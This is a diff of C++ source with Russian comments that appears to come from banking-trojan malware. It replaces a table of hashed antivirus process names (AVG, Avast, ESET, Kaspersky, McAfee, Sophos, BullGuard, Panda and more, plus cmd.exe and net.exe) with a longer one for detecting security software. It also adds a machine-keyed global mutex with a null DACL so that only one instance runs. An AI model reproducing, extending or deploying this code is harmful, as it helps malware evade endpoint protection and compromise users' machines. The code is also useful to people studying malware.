@@ -31,31 +31,58 @@ namespace UTILSDEBUGSTRINGS
 //  Список имён процессов анти вирусов
 //--------------------------------------------------
 const static DWORD AV_HASHES[] = {
-0xB434E36B /* avgam.exe*/, 0x66048E61 /* avgchsvx.exe*/, 0xC316EB3B /* avgemc.exe*/,
-0xF214BB85 /* avgfws9.exe*/, 0x8316E7C2 /* avgfrw.exe*/, 0x126BD3AC /* avgidsagent.exe*/,
-0x852539F2 /* avgidsmonitor.exe*/, 0x7316C7CA /* avgnsx.exe*/, 0x7316B7CA /* avgrsx.exe*/,
-0xF230AF11 /* avgtray.exe*/, 0xC21C8E60 /* avgwdsvc.exe*/, 0x5D8F352 /* cfp.exe*/,
-0x241A9060 /* cmdagent.exe*/, 0xE5A4129 /* defensewall.exe*/, 0x66270192 /* defensewall_serv.exe*/,
-0xE512D3F3 /* ekrn.exe*/, 0x9512E3CB /* egui.exe*/, 0x561AA5CD /* fsav32.exe*/,
-0x3610E7E8 /* fsdfwd.exe*/, 0x5616D1CD /* fsgk32.exe*/, 0xAEB36B09 /* fsgk32st.exe*/,
-0x410C110A /* fshdll32.exe*/, 0x433EC9FE /* fsm32.exe*/, 0x5602F9CD /* fsma32.exe*/,
-0x7606B7C9 /* fsorsp.exe*/, 0x563EC9CD /* fssm32.exe*/, 0x5D8FBD2 /* avp.exe*/,
-0x6F1AC743 /* zanda.exe*/, 0x85D89703 /* zlh.exe*/, 0x9504A71A /* nvoy.exe*/,
-0x431EC35D /* nvcoas.exe*/, 0x1504AB6B /* nuaa.exe*/, 0x4612B3E4 /* nsesvc.exe*/,
-0x5D8C72A /* nip.exe*/, 0x5012BCFF /* njeeves.exe*/, 0xD6392DCF /* npcsvc32.exe*/,
-0x5A16AAA5 /* elogsvc.exe*/, 0x2A1AF36A /* oacat.exe*/, 0x6A1ADF02 /* oahlp.exe*/,
-0xA1AB3F2 /* oasrv.exe*/, 0x9506FBCB /* oaui.exe*/, 0x1566CB2C /* op_mon.exe*/,
-0x35D8FB7A /* acs.exe*/, 0x2738E742 /* sbpfcl.exe*/, 0xEE0E9B48 /* sbpflunch.exe*/,
-0x4514AF22 /* sbpfsvc.exe*/, 0xBB1A46E1 /* dwengine.exe*/, 0xA28A73A4 /* spideragent.exe*/,
-0x381BC2F2 /* spidergate.exe*/, 0x211CCB3F /* spiderml.exe*/, 0xA11CCB26 /* spidernt.exe*/,
-0x711CCBFF /* spiderui.exe*/, 0xA416F063 /* mcagent.exe*/, 0xAD0753FA /* mcshield.exe*/,
-0xB3057B03 /* mcsvhost.exe*/, 0x3014C080 /* mfefire.exe*/, 0x5034B491 /* mfevtps.exe*/,
-0xAE28938 /* mobkbackup.exe*/, 0x240D57C1 /* mpfalert.exe*/, 0x7A873290 /* certificationmanagerservicent.exe*/,
-0xF98BF56E /* managmentagentnt.exe*/, 0xDB30A8A0 /* mgntsvc.exe*/, 0xB11CECE8 /* routernt.exe*/,
-0x25127BF7 /* sbeconsole.exe*/, 0xB9BC03C9 /* sophosupdatemgr.exe*/, 0x123EF381 /* afwserv.exe*/,
-0xC63C8E63 /* avastsvc.exe*/, 0xF43EB7B0 /* avastui.exe*/, 0x5336ABA8 /* avfwsvc.exe*/,
-0x2232E388 /* avguard.exe*/, 0x9D16D2A3 /* avshadow.exe*/, 0xA010DE48 /* avwebgrd.exe*/,
-0x581AC378 /* avmailc.exe*/, 0x2434E312 /* avgnt.exe*/, 0xC612E833 /* msseces.exe*/,
+0x66328A61 /* avgcsrvx.exe*/, 0xE212D301 /* avgemcx.exe*/, 0x126BD3AC /* avgidsagent.exe*/,
+0x7316C7CA /* avgnsx.exe*/, 0x7316B7CA /* avgrsx.exe*/, 0xF230AF11 /* avgtray.exe*/,
+0xC21C8E60 /* avgwdsvc.exe*/, 0x3338B71A /* vprot.exe*/, 0x6D6B2D81 /* toolbarupdater.exe*/,
+0xC316E7EA /* avgfws.exe*/, 0xC63C8E63 /* avastsvc.exe*/, 0xF43EB7B0 /* avastui.exe*/,
+0x123EF381 /* afwserv.exe*/, 0x2232E388 /* avguard.exe*/, 0x9D16D2A3 /* avshadow.exe*/,
+0x2434E312 /* avgnt.exe*/, 0x361EDF4B /* sched.exe*/, 0xA010DE48 /* avwebgrd.exe*/,
+0x581AC378 /* avmailc.exe*/, 0x5336ABA8 /* avfwsvc.exe*/, 0x9512E3CB /* egui.exe*/,
+0xE512D3F3 /* ekrn.exe*/, 0xBB1A46E1 /* dwengine.exe*/, 0xA17A2789 /* dwservice.exe*/,
+0xF2EC13EA /* dwnetfilter.exe*/, 0xD96A6F68 /* frwl_svc.exe*/, 0x6D4D4D3E /* frwl_notify.exe*/,
+0xA28A73A4 /* spideragent.exe*/, 0x5D8FBD2 /* avp.exe*/, 0x1566CB2C /* op_mon.exe*/,
+0x35D8FB7A /* acs.exe*/, 0xB312A703 /* ccsvchst.exe*/, 0x5A16AAA5 /* elogsvc.exe*/,
+0x35D8C722 /* nhs.exe*/, 0xD6392B8D /* nigsvc32.exe*/, 0xC232A8FE /* niguser.exe*/,
+0x5012BCFF /* njeeves.exe*/, 0x65D8C713 /* nnf.exe*/, 0x56392DCD /* npfsvc32.exe*/,
+0x4332A8F2 /* npfuser.exe*/, 0x4706A8F3 /* nprosec.exe*/, 0x5634EA46 /* npsvc32.exe*/,
+0x4612B3E4 /* nsesvc.exe*/, 0x431EC35D /* nvcoas.exe*/, 0x9504A71A /* nvoy.exe*/,
+0x6F1AC743 /* zanda.exe*/, 0x85D89703 /* zlh.exe*/, 0xBC1D1798 /* popwndexe.exe*/,
+0xB302DFA3 /* ravmond.exe*/, 0xD232EF25 /* rsmgrsvc.exe*/, 0xE630B753 /* rstray.exe*/,
+0x5D8F352 /* cfp.exe*/, 0x351ECFE2 /* clps.exe*/, 0xD938B333 /* clpsls.exe*/,
+0x241A9060 /* cmdagent.exe*/, 0xE010405B /* unsecapp.exe*/, 0x6530FE17 /* avkproxy.exe*/,
+0xA859A78A /* avkservice.exe*/, 0xFE30AF11 /* avktray.exe*/, 0xAE36EBB8 /* avkwctl.exe*/,
+0x13EF358 /* gdscan.exe*/, 0x5C8A82BB /* gdfirewalltray.exe*/, 0x5336AA21 /* gdfwsvc.exe*/,
+0x308083C /* akvbackupservice.exe*/, 0xD0B8CE46 /* tsnxgservice.exe*/,
+0x2416F3A0 /* bdagent.exe*/, 0x163EEBC9 /* vsserv.exe*/, 0x964CAAC2 /* updatesrv.exe*/,
+0xB8961762 /* uiwatchdog.exe*/, 0x5800381D /* coreserviceshell.exe*/, 0xF2B6E078 /* coreframeworkhost.exe*/,
+0xA014596B /* uiseagnt.exe*/, 0xC13EAFE2 /* pctssvc.exe*/, 0x4614B358 /* pctsauxs.exe*/,
+0x613EFFFA /* pctsgui.exe*/, 0xF7309AF0 /* fpavserver.exe*/, 0x675EABDD /* fprottray.exe*/,
+0x2416EB12 /* agent.exe*/, 0x6530B75E /* iptray.exe*/, 0xDC02AFEA /* psimsvc.exe*/,
+0x3608C3C2 /* pshost.exe*/, 0x9038A01F /* pavsrvx86.exe*/, 0xD630AB3B /* psctrls.exe*/,
+0xC30CDF42 /* pavjobs.exe*/, 0x460EB3EB /* psksvc.exe*/, 0x430AABA9 /* pavfnsvr.exe*/,
+0x1138B3F2 /* tpsrv.exe*/, 0xE5323AD3 /* webproxy.exe*/, 0xBB1AE6A1 /* avengine.exe*/,
+0x1532AB89 /* pavprsrv.exe*/, 0x3300DF92 /* srvload.exe*/, 0x9D1C9F10 /* apvxdwin.exe*/,
+0x2710CB99 /* pavbckpt.exe*/, 0x7606B7C9 /* fsorsp.exe*/, 0xAEB36B09 /* fsgk32st.exe*/,
+0xE62FAE04 /* fshoster32.exe*/, 0x5616D1CD /* fsgk32.exe*/, 0x5602F9CD /* fsma32.exe*/,
+0x3610E7E8 /* fsdfwd.exe*/, 0x433EC9FE /* fsm32.exe*/, 0x97419EA /* msseces.exe	*/,
+0xA416F063 /* mcagent.exe*/, 0xAD0753FA /* mcshield.exe*/, 0xB3057B03 /* mcsvhost.exe*/,
+0x3014C080 /* mfefire.exe*/, 0x5034B491 /* mfevtps.exe*/, 0xE33D0F92 /* mcpvtray.exe*/,
+0x241C40C5 /* bullguard.exe*/, 0xA3C533B0 /* bullguardbhvscanner.exe*/,
+0xBD449831 /* bullguardscanner.exe*/, 0xB1E27B7E /* bullguardupdate.exe*/,
+0xE53078D4 /* emlproxy.exe*/, 0x2C0910A4 /* onlinent.exe*/, 0xC53EB3E4 /* opssvc.exe*/,
+0xDD00AFA9 /* quhlsvc.exe*/, 0x5C30CBAB /* sapissvc.exe*/, 0x9404D70A /* scanmsg.exe*/,
+0xDB38CB8A /* scanwscs.exe*/, 0x5402AF22 /* sbamsvc.exe*/, 0x7B3ECFDA /* sbantray.exe*/,
+0x5C0CCB6B /* sbpimsvc.exe*/, 0x88303343 /* vbcmserv.exe*/, 0x6C30774B /* vbsystry.exe*/,
+0x3436E381 /* adaware.exe*/, 0xE2207309 /* adawarebp.exe*/, 0x98FCA456 /* adawareservice.exe*/,
+0x1707FDB5 /* wajamupdater.exe*/, 0x85289F88 /* arcaconfsv.exe*/, 0x8B26BF8F /* arcamainsv.exe*/,
+0xCE5FED2B /* arcaremotesvc.exe*/, 0xD16A6442 /* arcataskservice.exe*/,
+0xA302EB22 /* avmenu.exe*/, 0x10263220 /* guardxkickoff.exe*/, 0x377149C9 /* guardxservicce.exe*/,
+0x3B14890D /* confirm.dll*/, 0x551E89FA /* core.dll*/, 0xE300B1F2 /* flash.dll*/,
+0xE50A81C2 /* imun.dll*/, 0xC004A9A5 /* imunsvc.exe*/, 0x45D8C74A /* net.exe*/,
+0x1504EBC6 /* net1.exe*/, 0x2608B1FA /* share.dll*/, 0x45D8F30B /* cmd.exe*/,
+0x7538DB13 /* ping.exe*/, 0x42AAE902 /* panda_url_filtering.exe*/, 0xAB06DF0A /* psanhost.exe*/,
+0xB0CE7D1 /* psunmain.exe*/, 0x9906EFA4 /* solocfg.exe*/, 0x2A3090E4 /* solosent.exe*/,
+0x96B217F2 /* vba32ldr.exe*/, 0xCE0E58F3 /* vbascheduler.exe*/,
 0};
 
 
@@ -2750,6 +2777,57 @@ string GetCommandParamByIndex(const char* ParamList, DWORD ArgIndex)
 	}
 
 	return string();
+}
+
+// Ф-ция для создания единственного экземпляра чего-либо.
+// Для обеспечения единственности используется захват мьютекса.
+// Всякий кто попробует захватить его снова - завершится с таймаутом.
+// 
+// В случае успешного захвата возвращает хендл захваченного мьютекса
+// В случае неуспешного захвата возвращает NULL
+//
+HANDLE TryCreateSingleInstance(const char* MutexPrefix)
+{
+	CHAR MutexName[300];
+
+	m_memset(MutexName, 0, sizeof(MutexName));
+
+	// Создаем имя для мьютекса в пространстве имен Global
+	PCHAR MachineId = MakeMachineID();
+	
+	m_lstrcat(MutexName, "Global\\");
+	m_lstrcat(MutexName, MutexPrefix);
+	m_lstrcat(MutexName, MachineId);
+
+	STR::Free(MachineId);
+
+	//DBG("TryCreateSingleInstance", "Mutex name '%s'.", MutexName);
+
+	// При создании делаем нулевой DACL для возможности открытия мьютекса 
+	// из под любого пользователя
+
+	SECURITY_ATTRIBUTES sa;
+	SECURITY_DESCRIPTOR sd;
+
+	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
+
+	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
+	sa.lpSecurityDescriptor = &sd;
+	sa.bInheritHandle = FALSE;
+
+	// Создаем мьютекс с нулевым DACL
+	HANDLE MutexHandle = (HANDLE)pCreateMutexA(&sa, FALSE, MutexName);
+	if (MutexHandle == NULL) return NULL;
+
+	// При помощи WaitForSingleObject захватываем владение мьютексом.
+	DWORD WaitResult = (DWORD)pWaitForSingleObject(MutexHandle, 1000);
+	if (WaitResult == WAIT_OBJECT_0) return MutexHandle;
+
+	// Все коды возврата, которые отличаются от WAIT_OBJECT_0 - считать неудачей.
+	pCloseHandle(MutexHandle);
+
+	return NULL;
 }
 
 
